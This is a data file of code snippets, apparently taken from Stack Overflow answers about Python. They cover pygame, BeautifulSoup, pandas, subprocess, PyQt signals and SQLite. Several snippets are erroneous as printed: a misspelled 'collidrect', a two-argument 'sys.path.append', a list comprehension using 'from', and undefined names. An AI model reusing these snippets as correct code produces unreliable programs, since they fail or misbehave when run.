</snippet></ROW><ROW><id>20469312</id><snippet># self.surface.get_rect().collidrect(another_rectangle)

self.surface.get_rect().collidrect(npc.rect)


self.surface.get_rect().collidrect(another_surface.get_rect())
self.surface.get_rect().collidrect(some_sprite.rect)
self.surface.get_rect().collidrect(pygame.Rect(x,y,width,height))

another_surface.get_rect().collidrect(self.surface.get_rect())
some_sprite.rect.collidrect(self.surface.get_rect())
pygame.Rect(x,y,width,height).collidrect(self.surface.get_rect())
</snippet></ROW><ROW><id>20469312</id><snippet>.rect</snippet></ROW><ROW><id>20469312</id><snippet>self.surface.rect</snippet></ROW><ROW><id>20469312</id><snippet>.get_rect()</snippet></ROW><ROW><id>20469312</id><snippet>self.surface.get_rect()</snippet></ROW><ROW><id>20469312</id><snippet>collide_rect()</snippet></ROW><ROW><id>20469312</id><snippet>pygame.Rect.colliderect()</snippet></ROW><ROW><id>20469312</id><snippet>Rect</snippet></ROW><ROW><id>20469312</id><snippet>surface.get_rect()</snippet></ROW><ROW><id>20469312</id><snippet>sprite.rect</snippet></ROW><ROW><id>20469312</id><snippet>pygame.Rect</snippet></ROW><ROW><id>20469312</id><snippet>pygame.Rect.collidepoint</snippet></ROW><ROW><id>20469715</id><snippet>.find()</snippet></ROW><ROW><id>20469715</id><snippet>nextlink = soup.find("div", {"class" : "alignright single"})
</snippet></ROW><ROW><id>20469715</id><snippet>for nextlink in soup.findAll("div", {"class" : "alignright single"}):
    a = nextlink.find('a')
    print a.get('href')
</snippet></ROW><ROW><id>20469715</id><snippet>a = nextlink.find('a', href=True)
print a['href']
</snippet></ROW><ROW><id>20469715</id><snippet>href=True</snippet></ROW><ROW><id>20469715</id><snippet>href</snippet></ROW><ROW><id>20469715</id><snippet>a.get()</snippet></ROW><ROW><id>20469715</id><snippet>&lt;a href="..."&gt;</snippet></ROW><ROW><id>20469715</id><snippet>a</snippet></ROW><ROW><id>20469715</id><snippet>None</snippet></ROW><ROW><id>20469715</id><snippet>.find()</snippet></ROW><ROW><id>20469715</id><snippet>nextlink = soup.find('a', rel='next', href=True)
if nextlink is not None:
    print a['href']
</snippet></ROW><ROW><id>20469715</id><snippet>div</snippet></ROW><ROW><id>20469715</id><snippet>rel="next"</snippet></ROW><ROW><id>20469715</id><snippet>urllib2</snippet></ROW><ROW><id>20469715</id><snippet>response = urllib2.urlopen(url1)
soup = BeautifulSoup(response.read(), from_encoding=response.info().getparam('charset'))
</snippet></ROW><ROW><id>20469715</id><snippet>&gt;&gt;&gt; import urllib2
&gt;&gt;&gt; from bs4 import BeautifulSoup
&gt;&gt;&gt; response = urllib2.urlopen('http://www.dailyhadithonline.com/2013/07/21/hadith-on-clothing-the-lower-garment-should-be-hallway-between-the-shins/')
&gt;&gt;&gt; soup = BeautifulSoup(response.read(), from_encoding=response.info().getparam('charset'))
&gt;&gt;&gt; soup.find('a', rel='next', href=True)['href']
u'http://www.dailyhadithonline.com/2013/07/21/hadith-on-clothing-women-should-lower-their-garments-to-cover-their-feet/'
</snippet></ROW><ROW><id>20469815</id><snippet>@classmethod</snippet></ROW><ROW><id>20469815</id><snippet>self.sprite</snippet></ROW><ROW><id>20469815</id><snippet>__init__</snippet></ROW><ROW><id>20469815</id><snippet>@classmethod</snippet></ROW><ROW><id>20469815</id><snippet>self.sprite</snippet></ROW><ROW><id>20469815</id><snippet>sprite</snippet></ROW><ROW><id>20469815</id><snippet>__init__</snippet></ROW><ROW><id>20469815</id><snippet>class Sprite(pygame.sprite.Sprite):

    sprite = pygame.sprite.Group()

    def __init__(self, Image, pos)
        # instance variable - value copied from class variable
        print self.sprite 

        # class variable 
        print self.__class__.sprite 

    @classmethod  
    def sprites(self):
        # instance variable not exists

        # class variable 
        print self.sprite 
</snippet></ROW><ROW><id>20470012</id><snippet>from mymodule import somefunc

class TestingFunctionsTest(unittest.TestCase):
    def test_somefunc(self):
        self.assertEqual(somefunc(), [1, 2, 3])
</snippet></ROW><ROW><id>20470012</id><snippet>[1, 2, 3]</snippet></ROW><ROW><id>20470141</id><snippet>choices</snippet></ROW><ROW><id>20470141</id><snippet>if req.method == "POST":  
    frm = myForm(data=req.POST, choices=ch)
</snippet></ROW><ROW><id>20470180</id><snippet>C:\python pyintaller.py --onefile -w guiscript.py
</snippet></ROW><ROW><id>20470245</id><snippet>np.argmin(large.cumsum() &lt; limit)
</snippet></ROW><ROW><id>20470245</id><snippet>(large.cumsum() &lt; limit).argmin()
</snippet></ROW><ROW><id>20470245</id><snippet>In [6]: %timeit (large.cumsum() &lt; limit).argmin()
10000 loops, best of 3: 33.8 µs per loop
</snippet></ROW><ROW><id>20470245</id><snippet>large</snippet></ROW><ROW><id>20470245</id><snippet>limit = 100000.0/2</snippet></ROW><ROW><id>20470245</id><snippet>In [4]: %timeit (large.cumsum() &lt; limit).argmin()
1000 loops, best of 3: 444 µs per loop
</snippet></ROW><ROW><id>20470245</id><snippet>import numpy as np</snippet></ROW><ROW><id>20470245</id><snippet>import numpy as nm</snippet></ROW><ROW><id>20470547</id><snippet>timeit</snippet></ROW><ROW><id>20470547</id><snippet>$ bin/python -mtimeit -n10000000 -s 'n = 1.345' 'int(n)'
10000000 loops, best of 3: 0.234 usec per loop
$ bin/python -mtimeit -n10000000 -s 'n = 1.345' 'n // 1'
10000000 loops, best of 3: 0.218 usec per loop
</snippet></ROW><ROW><id>20470547</id><snippet>int()</snippet></ROW><ROW><id>20470547</id><snippet>&gt;&gt;&gt; import dis
&gt;&gt;&gt; def use_int(n):
...     return int(n)
... 
&gt;&gt;&gt; def use_floordiv(n):
...     return n // 1
... 
&gt;&gt;&gt; dis.dis(use_int)
  2           0 LOAD_GLOBAL              0 (int)
              3 LOAD_FAST                0 (n)
              6 CALL_FUNCTION            1
              9 RETURN_VALUE        
&gt;&gt;&gt; dis.dis(use_floordiv)
  2           0 LOAD_FAST                0 (n)
              3 LOAD_CONST               1 (1)
              6 BINARY_FLOOR_DIVIDE 
              7 RETURN_VALUE        
</snippet></ROW><ROW><id>20470547</id><snippet>LOAD_GLOBAL</snippet></ROW><ROW><id>20470547</id><snippet>CALL_FUNCTION</snippet></ROW><ROW><id>20470547</id><snippet>LOAD_CONST</snippet></ROW><ROW><id>20470547</id><snippet>BINARY_FLOOR_DIVIDE</snippet></ROW><ROW><id>20470547</id><snippet>LOAD_CONST</snippet></ROW><ROW><id>20470547</id><snippet>LOAD_GLOBAL</snippet></ROW><ROW><id>20470547</id><snippet>int()</snippet></ROW><ROW><id>20470547</id><snippet>// 1</snippet></ROW><ROW><id>20470547</id><snippet>$ bin/python -mtimeit -n10000000 -s 'n = 1.345' 'int(n)'
10000000 loops, best of 3: 0.233 usec per loop
$ bin/python -mtimeit -n10000000 -s 'n = 1.345; int_=int' 'int_(n)'
10000000 loops, best of 3: 0.195 usec per loop
$ bin/python -mtimeit -n10000000 -s 'n = 1.345' 'n // 1'
10000000 loops, best of 3: 0.225 usec per loop
</snippet></ROW><ROW><id>20470547</id><snippet>int(n)</snippet></ROW><ROW><id>20470547</id><snippet>int(n)</snippet></ROW><ROW><id>20470547</id><snippet>n // 1</snippet></ROW><ROW><id>20470547</id><snippet>// 1</snippet></ROW><ROW><id>20470561</id><snippet>C:\Python27\Lib\lib-tk</snippet></ROW><ROW><id>20470561</id><snippet>C:\Python33\Lib\tkinter</snippet></ROW><ROW><id>20470561</id><snippet>print works</snippet></ROW><ROW><id>20470610</id><snippet>pandas</snippet></ROW><ROW><id>20470610</id><snippet>import pandas
data = pandas.read_csv(fname)
</snippet></ROW><ROW><id>20470713</id><snippet>subprocess.Popen('start executable.exe', shell=True)
</snippet></ROW><ROW><id>20470713</id><snippet>subprocess.Popen('start cmd /C executable.exe', shell=True)
</snippet></ROW><ROW><id>20470713</id><snippet>subprocess.Popen('start dir', shell=True)

subprocess.Popen('start cmd /C dir', shell=True)
</snippet></ROW><ROW><id>20470745</id><snippet>self.parent</snippet></ROW><ROW><id>20470745</id><snippet>self.parent.size</snippet></ROW><ROW><id>20470745</id><snippet>self.parent.pos</snippet></ROW><ROW><id>20470745</id><snippet>self.parent is None</snippet></ROW><ROW><id>20470774</id><snippet>a = ["part 1", "part 3" , "part 10", "part 2"]
print sorted(a, key=lambda x:int(x.split()[1]))
</snippet></ROW><ROW><id>20470774</id><snippet>['part 1', 'part 2', 'part 3', 'part 10']
</snippet></ROW><ROW><id>20470774</id><snippet>a.sort(key=lambda x:int(x.split()[1]))
print a
</snippet></ROW><ROW><id>20470832</id><snippet>row</snippet></ROW><ROW><id>20470832</id><snippet>import datetime as DT
with open(file, 'rb') as csvfile:
    reader = csv.reader(csvfile, dialect='excel')
    for row in reader:
        try:
            date = DT.datetime.strptime(row[0], '%m/%d/%Y')
        except ValueError:
            continue 
    args = [logID] + row  
    sql = "INSERT INTO table VALUES ({})".format(', '.join(['?']*len(args)))
    cursor.execute(sql, args)
</snippet></ROW><ROW><id>20470832</id><snippet>cursor.execute</snippet></ROW><ROW><id>20470832</id><snippet>manyargs</snippet></ROW><ROW><id>20470832</id><snippet>cursor.executemany("INSERT INTO table VALUES(?,?,?,?,?)", manyargs)
</snippet></ROW><ROW><id>20470832</id><snippet>cursor.execute("INSERT INTO table VALUES(" +values+ ");")
</snippet></ROW><ROW><id>20470832</id><snippet>cursor.execute("INSERT INTO table VALUES(?,?,?,?,?)", args)
</snippet></ROW><ROW><id>20470832</id><snippet>?</snippet></ROW><ROW><id>20470832</id><snippet>args</snippet></ROW><ROW><id>20470832</id><snippet>args</snippet></ROW><ROW><id>20470832</id><snippet>cursor.execute</snippet></ROW><ROW><id>20470832</id><snippet>args</snippet></ROW><ROW><id>20470832</id><snippet>csv.reader</snippet></ROW><ROW><id>20470969</id><snippet>_columns = {
        'county': fields.text("the label for the field"),
    }
</snippet></ROW><ROW><id>20470969</id><snippet>&lt;field name="county_id" string="label for the field"/&gt;
</snippet></ROW><ROW><id>20470969</id><snippet>base.view_users_form</snippet></ROW><ROW><id>20470969</id><snippet>&lt;field name="model"&gt;hubclub.counties&lt;/field&gt;</snippet></ROW><ROW><id>20470969</id><snippet>hubclub.counties</snippet></ROW><ROW><id>20470969</id><snippet>base.view_users_form</snippet></ROW><ROW><id>20470969</id><snippet>&lt;field name="inherit_id" ref="base.view_users_form"/&gt;</snippet></ROW><ROW><id>20470969</id><snippet>_rec_name</snippet></ROW><ROW><id>20470969</id><snippet>_rec_name = "field_name"
</snippet></ROW><ROW><id>20470969</id><snippet>name_get()</snippet></ROW><ROW><id>20471104</id><snippet>expected_return = MagicMock()

def fake_filter(**kwargs):
    if 'tags__name__in' in kwargs:
        raise FieldError()
    if 'tags__icontains' in kwargs:
        return expected_return
    raise ValueError("Neither expected kwarg present")

mock_queryset = MagicMock()
mock_queryset.filter = fake_filter
</snippet></ROW><ROW><id>20471265</id><snippet>assoc .iv=IV.Measurement
ftype IV.Measurement=C:\Python27\pythonw.exe "C:\Test Files\myscript.pyw" %1 %*
</snippet></ROW><ROW><id>20471265</id><snippet>pythonw.exe</snippet></ROW><ROW><id>20471265</id><snippet>myscript.pyw</snippet></ROW><ROW><id>20471265</id><snippet>"\"</snippet></ROW><ROW><id>20471265</id><snippet>my_iv_file.iv</snippet></ROW><ROW><id>20471265</id><snippet>sys.argv</snippet></ROW><ROW><id>20471265</id><snippet>myscript.pyw</snippet></ROW><ROW><id>20471265</id><snippet>["C:\Test Files\myscript.pyw", "C:\Test Files\my_iv_file.iv"]
</snippet></ROW><ROW><id>20471460</id><snippet>indent/python.vim</snippet></ROW><ROW><id>20471460</id><snippet>$VIMRUNTIME/indent/python.py</snippet></ROW><ROW><id>20471460</id><snippet>$HOME/.vim/indent/python.py</snippet></ROW><ROW><id>20471460</id><snippet>    " Unless the previous line was a one-liner
    if getline(plnumstart) =~ '^\s*\(for\|if\|try\)\&gt;'
      return plindent
    endif
</snippet></ROW><ROW><id>20471460</id><snippet>elif</snippet></ROW><ROW><id>20471460</id><snippet>    " Unless the previous line was a one-liner
    if getline(plnumstart) =~ '^\s*\(for\|if\|elif\|try\)\&gt;'
      return plindent
    endif
</snippet></ROW><ROW><id>20471559</id><snippet>operator.itemgetter()</snippet></ROW><ROW><id>20471559</id><snippet>from operator import itemgetter

items_2_and_5 = itemgetter(2, 5)

field_two, field_five = items_2_and_5(data.split('|', 6))
</snippet></ROW><ROW><id>20471559</id><snippet>itemgetter()</snippet></ROW><ROW><id>20471559</id><snippet>&gt;&gt;&gt; from operator import itemgetter
&gt;&gt;&gt; items_2_and_5 = itemgetter(2, 5)
&gt;&gt;&gt; items_2_and_5(range(10))
(2, 5)
&gt;&gt;&gt; items_2_and_5('hello world!')
('l', ' ')
</snippet></ROW><ROW><id>20471559</id><snippet>str.split()</snippet></ROW><ROW><id>20471559</id><snippet> $ bin/python -mtimeit -s 'data = "0|1|2|3|4|5|6|7|8"' 'fields = data.split("|", 6); field_two, field_five = data[2], data[5]'
 1000000 loops, best of 3: 0.935 usec per loop
 $ bin/python -mtimeit -s 'data = "0|1|2|3|4|5|6|7|8"; from operator import itemgetter; items_2_and_5 = itemgetter(2, 5)' 'field_two, field_five = items_2_and_5(data.split("|", 6))'
 1000000 loops, best of 3: 0.944 usec per loop
</snippet></ROW><ROW><id>20471559</id><snippet>$ bin/python -mtimeit -s 'data = "0|1|2|3|4|5|6|7|8"' 'fields = data.split("|", 6); field_two, field_four, field_five = data[2], data[4], data[5]'
1000000 loops, best of 3: 0.935 usec per loop
$ bin/python -mtimeit -s 'data = "0|1|2|3|4|5|6|7|8"; from operator import itemgetter; items_2_4_and_5 = itemgetter(2, 4, 5)' 'field_two, field_four, field_five = items_2_4_and_5(data.split("|", 6))'
1000000 loops, best of 3: 0.912 usec per loop
</snippet></ROW><ROW><id>20471698</id><snippet>variable = 42
</snippet></ROW><ROW><id>20471698</id><snippet>import lib

print lib.variable
</snippet></ROW><ROW><id>20471698</id><snippet>from lib import variable

print variable
</snippet></ROW><ROW><id>20471698</id><snippet>lib.py</snippet></ROW><ROW><id>20471698</id><snippet>import</snippet></ROW><ROW><id>20471785</id><snippet>&gt;&gt;&gt; s = wn.synsets('pretty')[0]
&gt;&gt;&gt; s.lemma_names
['pretty']
</snippet></ROW><ROW><id>20471785</id><snippet>Synset</snippet></ROW><ROW><id>20471785</id><snippet>help</snippet></ROW><ROW><id>20471785</id><snippet>dir</snippet></ROW><ROW><id>20472074</id><snippet>&lt;ul&gt;
{% for person in content %}
    &lt;li&gt;{{ person['name'] }}&lt;/li&gt;
{% endfor %}
&lt;/ul&gt;
</snippet></ROW><ROW><id>20472417</id><snippet>write_file</snippet></ROW><ROW><id>20472417</id><snippet>testfile</snippet></ROW><ROW><id>20472417</id><snippet>def test_write_file(self):
    a = [1,2,3]
    write_file(a)
    with open('testfile') as f:
        assert f.read() == '123' # Replace this line with the method
                                 #   provided by your testing framework.
</snippet></ROW><ROW><id>20472417</id><snippet>mock.mock_open</snippet></ROW><ROW><id>20472419</id><snippet>os.waitpid(pid, 0)
</snippet></ROW><ROW><id>20472618</id><snippet>results = [] # A list of the results that 
             # that we will get in the while loop
i=0
x=0
n=0

while x &lt; len(round1):
    n +=1
    results.append(' '.join(map(str,
                                ['match number',
                                n,
                                ':' ,
                                round1[x],
                                scoretop[i],
                                'VS','team:',
                                round1[x+1],scorebottom[i],"\n"])))
    x=x+2
    i=i+1
</snippet></ROW><ROW><id>20472618</id><snippet>results</snippet></ROW><ROW><id>20472618</id><snippet>for i in results:
    send_to_database(i)
</snippet></ROW><ROW><id>20472618</id><snippet>send_to_database('\n'.join(results))
</snippet></ROW><ROW><id>20472662</id><snippet>from projectname.algorithms import module1


module1.method1(parameter1)

module1.method2(parameter1)
</snippet></ROW><ROW><id>20472689</id><snippet>import pandas as pd
import numpy as np
import datetime
df = pd.DataFrame({'Time':['1:10,10', '1:16,32', '3:03,04']})
df['time'] = df.Time.apply(lambda x: datetime.datetime.strptime(x,'%M:%S,%f'))
df['timedelta'] = df.time - datetime.datetime.strptime('00:00,0','%M:%S,%f')
df['secs'] = df['timedelta'].apply(lambda x: x / np.timedelta64(1, 's'))
print df
</snippet></ROW><ROW><id>20472689</id><snippet>      Time                       time       timedelta    secs
0  1:10,10 1900-01-01 00:01:10.100000 00:01:10.100000   70.10
1  1:16,32 1900-01-01 00:01:16.320000 00:01:16.320000   76.32
2  3:03,04 1900-01-01 00:03:03.040000 00:03:03.040000  183.04
</snippet></ROW><ROW><id>20472689</id><snippet>import pandas as pd
import numpy as np
import datetime

import re
regex = re.compile(r"(?P&lt;minus&gt;-)?((?P&lt;minutes&gt;\d+):)?(?P&lt;seconds&gt;\d+)(,(?P&lt;centiseconds&gt;\d{2}))?")

def parse_time(time_str):
    parts = regex.match(time_str)
    if not parts:
        return
    parts = parts.groupdict()
    time_params = {}
    for (name, param) in parts.iteritems():
        if param and (name != 'minus'):
            time_params[name] = int(param)
    time_params['milliseconds'] = time_params['centiseconds']*10
    del time_params['centiseconds']
    return (-1 if parts['minus'] else 1) * datetime.timedelta(**time_params)

df = pd.DataFrame({'Time':['-1:10,10', '1:16,32', '3:03,04']})
df['timedelta'] = df.Time.apply(lambda x: parse_time(x))
df['secs'] = df['timedelta'].apply(lambda x: x / np.timedelta64(1, 's'))
print df
</snippet></ROW><ROW><id>20472689</id><snippet>       Time        timedelta    secs
0  -1:10,10 -00:01:10.100000  -70.10
1   1:16,32  00:01:16.320000   76.32
2   3:03,04  00:03:03.040000  183.04
</snippet></ROW><ROW><id>20472836</id><snippet>def getMetaData(request):
    if is_invalid(request.POST):
        return redirect_url
    else:
        return None
</snippet></ROW><ROW><id>20472836</id><snippet>$.post(post_url, data, function(new_url) {
    if (new_url== null)
        do_stuff();
    else
        window.location.replace(new_url);
});
</snippet></ROW><ROW><id>20472926</id><snippet>QTreeView</snippet></ROW><ROW><id>20472926</id><snippet>QFileSystemModel</snippet></ROW><ROW><id>20472926</id><snippet>model = QFileSystemModel();
model.setRootPath(QDir.currentPath())
tree = QTreeView()
tree.setModel(model)
tree.setRootIndex(model.index(QDir.currentPath()))
tree.show()
</snippet></ROW><ROW><id>20472982</id><snippet>None</snippet></ROW><ROW><id>20472982</id><snippet>print(repr(result))
</snippet></ROW><ROW><id>20472982</id><snippet>'n'</snippet></ROW><ROW><id>20472982</id><snippet>print()</snippet></ROW><ROW><id>20472982</id><snippet>str()</snippet></ROW><ROW><id>20472982</id><snippet>'n'</snippet></ROW><ROW><id>20472982</id><snippet>print('n')</snippet></ROW><ROW><id>20472982</id><snippet>repr()</snippet></ROW><ROW><id>20472982</id><snippet>1</snippet></ROW><ROW><id>20472982</id><snippet>"1"</snippet></ROW><ROW><id>20472982</id><snippet>1</snippet></ROW><ROW><id>20472982</id><snippet>&gt;&gt;&gt; print(1)
1
&gt;&gt;&gt; print("1")
1
</snippet></ROW><ROW><id>20472982</id><snippet>&gt;&gt;&gt; 1
1
&gt;&gt;&gt; "1"
'1'
</snippet></ROW><ROW><id>20472993</id><snippet>import re

IDs = re.findall('(?&lt;=&lt;option value=")\w+', html)
names = re.findall('(?&lt;=&gt;)\w+(?=&lt;/option&gt;)', html)
nameID =  dict(zip(IDs,names))
</snippet></ROW><ROW><id>20473403</id><snippet>cv2.imread(path,-1)</snippet></ROW><ROW><id>20473423</id><snippet>l = [''] * 25
for yo in range(25):
    for x in range(31):
        y = yo - x / 3
        l[24 - yo] += (' ', '$')[y**2 - 20*y + (x**2) / 3 &lt; 0]

print('\n'.join(line[::-1] + line for line in l))
</snippet></ROW><ROW><id>20473423</id><snippet>$l .= ...</snippet></ROW><ROW><id>20473423</id><snippet>IndexError</snippet></ROW><ROW><id>20473423</id><snippet>$_</snippet></ROW><ROW><id>20473423</id><snippet>map</snippet></ROW><ROW><id>20473423</id><snippet>reverse</snippet></ROW><ROW><id>20473423</id><snippet>reversed</snippet></ROW><ROW><id>20473423</id><snippet>[::-1]</snippet></ROW><ROW><id>20473423</id><snippet>1/2</snippet></ROW><ROW><id>20473423</id><snippet>0.5</snippet></ROW><ROW><id>20473423</id><snippet>0</snippet></ROW><ROW><id>20473423</id><snippet>0.5</snippet></ROW><ROW><id>20473437</id><snippet>import os
i = 0
while True:
    i += 1
    newname = '{}{:d}.png'.format(filename, i)
    if os.path.exists(newname):
        continue
    plt.savefig(newname)
    break
</snippet></ROW><ROW><id>20473437</id><snippet>.png</snippet></ROW><ROW><id>20473437</id><snippet>png</snippet></ROW><ROW><id>20473437</id><snippet>import os
i = 0
while os.path.exists('{}{:d}.png'.format(filename, i)):
    i += 1
plt.savefig('{}{:d}.png'.format(filename, i))
</snippet></ROW><ROW><id>20473499</id><snippet>data</snippet></ROW><ROW><id>20473499</id><snippet>indices</snippet></ROW><ROW><id>20473499</id><snippet>from scipy.sparse import csr_matrix
rows = [0, 0, 0]
columns = [100, 47, 150]
data = [-1, +1, -1]
m = csr_matrix( (data,(rows, columns)), shape=(1, 300) )

indices = m.indices

# right permutation
m.indices = (indices + 1) % m.shape[1]

# left permutation
m.indices = (indices - 1) % m.shape[1]
</snippet></ROW><ROW><id>20473605</id><snippet>User.select().where(User.user_id == userID)</snippet></ROW><ROW><id>20473605</id><snippet>User</snippet></ROW><ROW><id>20473605</id><snippet>token</snippet></ROW><ROW><id>20473605</id><snippet>device_token</snippet></ROW><ROW><id>20473605</id><snippet>matching_users = Active_Users.select().where(Active_Users.user_id == userID) # returns an array of matching users even if there's just one
if matching_users is not None:
    token = matching_users[0].device_token
</snippet></ROW><ROW><id>20473669</id><snippet>Popen</snippet></ROW><ROW><id>20473669</id><snippet>subprocess</snippet></ROW><ROW><id>20473669</id><snippet>&gt;&gt;&gt; from subprocess import Popen
&gt;&gt;&gt; Popen("start", shell=True)
&lt;subprocess.Popen object at 0x02C199F0&gt;
</snippet></ROW><ROW><id>20473831</id><snippet>list</snippet></ROW><ROW><id>20473831</id><snippet>from random import randint

# user-defined class names are conventionally capitalized.
class Item:
    ...

class ItemCollection:
    def __init__(self, N=1024, num_defectives=10):
       self.list_of_items = [Item(i,0) for i in range(0,N)]]
       for i in range(0, self.num_defectives):
          r = randint(0,N)
          self.list_of_items[r].state = 1
       self.state_sum = sum(x.state for x in self.list_of_items)

    def states_of_one(self):
        return [ x from self.list_of_items if x.state == 1 ]

    def has_state_of_one(self, i):
        return self.list_of_items[i].state == 1
</snippet></ROW><ROW><id>20473867</id><snippet>Signal</snippet></ROW><ROW><id>20473867</id><snippet>import sys
from PySide import QtGui, QtCore

class ExtendedQLabel(QtGui.QLabel):

    #Signal that emits on MouseRelease
    labelClickSignal_1 = QtCore.Signal(QtGui.QMouseEvent, int)

    # init to -1
    labelId = -1

    # This is the new Constructor, Please note the double underscore 
    # before and behind `init`
    def __init__(self, parent, labelId):
        self.labelId = labelId
        QtGui.QLabel.__init__(self, parent)

    # emit labelClickSignal
    def mouseReleaseEvent(self, event):
        self.labelClickSignal_1.emit(event, self.labelId)


class Test(QtGui.QMainWindow):

    def __init__(self, parent=None):

       # same as yours [...]

    def addLabel(self, name, row):

        # please note the added argument
        label = ExtendedQLabel(name,row)

        # connect the signal
        label.labelClickSignal_1.connect(self.onLabelClicked_1)

        self.grid.addWidget(label, row, 1)

        row = row + 1

    def onLabelClicked_1(self, event,labelId):    
        if event.button() == QtCore.Qt.RightButton:
            print('right')
            print(labelId)
        else:
            print('left')
            print(labelId)
</snippet></ROW><ROW><id>20473867</id><snippet>labelClickSignal_1 = pyqtSignal(QtGui.QMouseEvent,int)
</snippet></ROW><ROW><id>20473867</id><snippet>from PyQt4.QtCore import QObject, pyqtSignal

class Foo(QObject):

    # This defines a signal called 'closed' that takes no arguments.
    closed = pyqtSignal()

    # This defines a signal called 'rangeChanged' that takes two
    # integer arguments.
    range_changed = pyqtSignal(int, int, name='rangeChanged')

    # This defines a signal called 'valueChanged' that has two overloads,
    # one that takes an integer argument and one that takes a QString
    # argument.  Note that because we use a string to specify the type of
    # the QString argument then this code will run under Python v2 and v3.
    valueChanged = pyqtSignal([int], ['QString'])
</snippet></ROW><ROW><id>20473882</id><snippet>zip()</snippet></ROW><ROW><id>20473882</id><snippet>csv</snippet></ROW><ROW><id>20473882</id><snippet>import csv

with open(filename, 'rb') as inputfile:
    reader = csv.reader(inputfile, delimiter=';')
    next(reader)  # skip first line

    names, values = zip(*reader)
</snippet></ROW><ROW><id>20474131</id><snippet>1.*1000./1000.</snippet></ROW><ROW><id>20474131</id><snippet>1.0000004</snippet></ROW><ROW><id>20474131</id><snippet>1</snippet></ROW><ROW><id>20474157</id><snippet>from rpy2 import robjects

robjects.r('''                         
source('quadro.R')
''')                                   #load the R script

quadro = robjects.globalenv['quadro']  #assign an R function in python
quadro(3)                              #to call in python, which returns a list
quadro(3)[0]                           #to get the first element: 9
</snippet></ROW><ROW><id>20474481</id><snippet>/var/www</snippet></ROW><ROW><id>20474481</id><snippet>my_app/
   static/
      logo.gif
      style.css
   templates/
      index.html
   main.py
</snippet></ROW><ROW><id>20474481</id><snippet>/home/youruser/</snippet></ROW><ROW><id>20474481</id><snippet>app.wsgi</snippet></ROW><ROW><id>20474481</id><snippet>/var/www/</snippet></ROW><ROW><id>20474481</id><snippet>/var/www/static</snippet></ROW><ROW><id>20474481</id><snippet>app.wsgi</snippet></ROW><ROW><id>20474481</id><snippet>import sys
sys.path.append(0, '/home/youruser/my_app')

from main import app as application
</snippet></ROW><ROW><id>20474576</id><snippet>c1, c2, c3, c4, c5 = sns.color_palette("husl", 5)
ax1 = plt.subplot2grid((3,2), (0,0))
ax2 = plt.subplot2grid((3,2), (0,1))
ax3 = plt.subplot2grid((3,2), (1,0))
ax4 = plt.subplot2grid((3,2), (1,1))
ax5 = plt.subplot2grid((3,2), (2,0))
d1.lag_plot(ax=ax1, color = c1, alpha=0.5)
d2.lag_plot(ax=ax2, color = c2, alpha=0.5)
d3.lag_plot(ax=ax3, color = c3, alpha=0.5)
d4.lag_plot(ax=ax4, color = c4, alpha=0.5)
</snippet></ROW><ROW><id>20474928</id><snippet>random.shuffle</snippet></ROW><ROW><id>20474928</id><snippet>import random
ss = ['I am here', 'I like spring', 'My house has two floors', 'Sun is bright']
random.shuffle(ss)
for s in ss:
    print s
</snippet></ROW><ROW><id>20474928</id><snippet>.join</snippet></ROW><ROW><id>20474928</id><snippet>import random
print '\n'.join(sorted(['I am here', 'I like spring', 'My house has two floors', 'Sun is bright'], key=lambda *args: random.random()))
</snippet></ROW><ROW><id>20474982</id><snippet>In [42]: data = """A,,B,
   ....: 1,2,1,2
   ....: 1,2,3,4
   ....: 5,6,7,8
   ....: """

In [43]: df = read_csv(StringIO(data),header=[0,1],index_col=None)

In [44]: df
Out[44]: 
   A  Unnamed: 1_level_0  B  Unnamed: 3_level_0
   1                   2  1                   2
0  1                   2  3                   4
1  5                   6  7                   8

[2 rows x 4 columns]

In [45]: df.columns = unsparsify_labels(df.columns)

In [46]: df
Out[46]: 
   A     B   
   1  2  1  2
0  1  2  3  4
1  5  6  7  8

[2 rows x 4 columns]

In [40]: def unsparsify_labels(index):
   ....:     new_labels = []
   ....:     for label in index.values:
   ....:         if label[0].startswith('Unnamed'):
   ....:             label = list(label)
   ....:             label[0] = ll
   ....:             label = tuple(label)
   ....:         else:
   ....:             ll = label[0]
   ....:         new_labels.append(label)
   ....:     return MultiIndex.from_tuples(new_labels)
   ....: 
</snippet></ROW><ROW><id>20475598</id><snippet>def setvalues(lst, index=0, value=None):
    for i in range(index, len(lst)):
        lst[i] = value

&gt;&gt;&gt;l=[1,2,3,4,5]
&gt;&gt;&gt;setvalues(l,index=2)
&gt;&gt;&gt;l
&gt;&gt;&gt;[1, 2, None, None, None]
</snippet></ROW><ROW><id>20475641</id><snippet>Set-Cookie</snippet></ROW><ROW><id>20475641</id><snippet>// TODO: replace expiration date with your own
br.set_cookie("agreed_to_notice=True; path=/; expires=Sunday, 08-Dec-14 23:12:40 GMT; secure")
</snippet></ROW><ROW><id>20475791</id><snippet>plt.scatter</snippet></ROW><ROW><id>20475791</id><snippet>plt.show()</snippet></ROW><ROW><id>20475791</id><snippet>interactive: True</snippet></ROW><ROW><id>20475791</id><snippet>.matplotlibrc</snippet></ROW><ROW><id>20475799</id><snippet>/usr/local/lib/python2.7/dist-packages</snippet></ROW><ROW><id>20475799</id><snippet>python setup.py</snippet></ROW><ROW><id>20475799</id><snippet>sudo apt-get install python-pip
sudo /usr/bin/pip install -U pytest
</snippet></ROW><ROW><id>20475848</id><snippet>def genoutput(iterable):
    for line in iterable:
        first, second = (l.strip() for l in line.split('-&gt;'))
        for value in second.split(','):
            yield first + value.strip()
</snippet></ROW><ROW><id>20475848</id><snippet>with open('inputfilename') as infh:
    lst = list(genoutput(infh))
</snippet></ROW><ROW><id>20475848</id><snippet>&gt;&gt;&gt; example = '''\
... 0 -&gt; 1
... 3 -&gt; 2
... 2 -&gt; 6,5
... 8 -&gt; 7
... 5 -&gt; 9,4,1
... '''.splitlines()
&gt;&gt;&gt; def genoutput(iterable):
...     for line in iterable:
...         first, second = (l.strip() for l in line.split('-&gt;'))
...         for value in second.split(','):
...             yield first + value.strip()
... 
&gt;&gt;&gt; list(genoutput(example))
['01', '32', '26', '25', '87', '59', '54', '51']
</snippet></ROW><ROW><id>20476150</id><snippet>Polygon</snippet></ROW><ROW><id>20476150</id><snippet>pyproj</snippet></ROW><ROW><id>20476150</id><snippet>matplotlib</snippet></ROW><ROW><id>20476150</id><snippet>basemap</snippet></ROW><ROW><id>20476150</id><snippet>from shapely.geometry import Polygon

#Create polygon from lists of points
x = [list of x vals]
y = [list of y vals]

some_poly = Polygon(x,y)

# Extract the point values that define the perimeter of the polygon
x, y = some_poly.exterior.coords.xy
